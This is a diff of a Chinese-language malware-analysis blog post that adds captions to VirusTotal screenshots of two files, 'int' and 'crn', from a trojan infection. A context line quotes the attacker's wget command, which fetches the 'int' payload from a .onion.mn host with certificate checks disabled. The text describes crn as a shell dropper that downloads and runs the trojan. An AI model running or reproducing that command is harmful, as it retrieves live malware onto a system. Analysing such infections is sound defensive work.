@@ -98,7 +98,9 @@ wget -t1 -T10 -qU- --no-check-certificate trumps4c4ohxvq7o.onion.mn/int -O./e0ee
 ```
 将下载下来的int和crn文件进行分析，
 virustotal返回的结果是crn是安全的，int只有Ikarus和SentinelOne (Static ML)两个引擎判断为木马，可见这个木马病毒在绕过引擎检测方面下了大量功夫。
+crn检测结果：
 ![20191219-trojan-17.png](https://hksanduo.github.io/images/20191219-trojan-17.png)
+int检测结果：
 ![20191219-trojan-18.png](https://hksanduo.github.io/images/20191219-trojan-18.png)
 返现int木马程序主体，crn为shell文件，目的是下载int木马程序并运行，crn文件并未进行编码和混淆，不太清楚作者为何这么做。
 ![20191219-trojan-19.png](https://hksanduo.github.io/images/20191219-trojan-19.png)
